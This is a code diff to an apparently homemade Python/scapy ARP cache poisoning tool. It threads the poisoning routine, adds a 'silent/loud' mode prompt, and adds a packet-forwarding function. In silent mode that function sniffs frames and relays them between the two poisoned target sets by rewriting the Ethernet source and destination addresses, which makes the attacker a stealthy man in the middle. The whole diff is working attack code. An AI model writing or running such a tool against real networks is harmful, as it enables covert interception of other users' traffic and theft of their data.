@@ -1,5 +1,7 @@
 from scapy.all import *
+from poisoning import poisoning
 import threading
+
 
 class arp():
 
@@ -64,25 +66,65 @@ class arp():
             if(self.direction != "y" and self.direction != "n"):
                 print("Enter a valid input!")
 
+        self.mode = ""
+        while(self.mode != "silent" and self.mode != "loud"):
+            self.mode = raw_input("Select poisoning mode (silent/loud): ")
+            if(self.mode != "silent" and self.mode != "loud"):
+                print("Enter a valid input!")
+
     def startProcess(self):
         #Now we will create and send the arp packets which will poison the caches.
-        while True:
-            for tar1 in self.target:
-                for tar2 in self.target2:
-                    if((tar1["ip"] != tar2["ip"]) and (tar1["mac"] != tar2["mac"])):
-                        arp_packet1 = Ether(src=self.ownMAC) / ARP(psrc=tar2["ip"], hwsrc=self.ownMAC, pdst=tar1["ip"], hwdst=tar1["mac"]) 
-                        sendp(arp_packet1, iface=self.interface)
-                        if(self.direction == "y"):
-                            arp_packet2 = Ether(src=self.ownMAC) / ARP(psrc=tar1["ip"], hwsrc=self.ownMAC, pdst=tar2["ip"], hwdst=tar2["mac"])
-                            sendp(arp_packet2, iface=self.interface)
-                #waits 20 seconds before the next spoof
-            time.sleep(10)
+        proc_thread = None
+        process = poisoning(self.interface, self.target, self.target2, self.ownMAC, self.direction)
+        proc_thread = threading.Thread(target=process.poisoning)
+        proc_thread.daemon = True
+        proc_thread.start()
+        #now we will redirect packets correctly -> do not enable port forwarding on your device
+        if(self.mode == "silent"):
+            while True:
+                sniff(store=0, prn=lambda packet: self.packetForwarding(packet), iface=self.interface)
 
-    def setInput(self, ip_range, ips_used, target, target2, ownMAC, direction):
+    def packetForwarding(self, packet):
+        #first we should check whether the packet satisfies the most basic requirement of having the IP + ether layer
+        if(self.mode == "silent"):
+            if packet.haslayer(Ether) and packet.haslayer(IP):
+                sender = None
+                senderfound = False
+                receiver = None
+                receiverfound = False
+                #Finds the sender to be in target or target2 set
+                for tar1 in self.target:
+                    if(tar1["mac"] == packet[Ether].src):
+                        sender = tar1
+                        senderfound = True
+                        for tar2 in self.target2:
+                            if(tar2["ip"] == packet[IP].dst):
+                                receiver = tar2
+                                receiverfound = True
+                if((not senderfound) or (not receiverfound)):
+                    for tar2 in self.target2:
+                        if(tar2["mac"] == packet[Ether].src):
+                            sender = tar2
+                            senderfound = True
+                            for tar1 in self.target:
+                                if(tar1["ip"] == packet[IP].dst):
+                                    receiver = tar1
+                                    receiverfound = True
+                #now we will modify the packet and forward it
+                if (senderfound and receiverfound):
+                    packet[Ether].src = self.ownMAC
+                    packet[Ether].dst = receiver["mac"]
+                    sendp(packet, iface=self.interface)
+                    print("we send packet from ip: {}, mac: {}, to ip: {}, mac: {}".format(sender["ip"], sender["mac"], receiver["ip"], receiver["mac"]))
+            
+
+    def setInput(self, ip_range, ips_used, target, target2, ownMAC, direction, mode):
         self.ip_range = ip_range
         self.ips_used = ips_used
         self.target = target
         self.target2 = target2
         self.ownMAC = ownMAC
         self.direction = direction
+        self.mode = mode
+
         
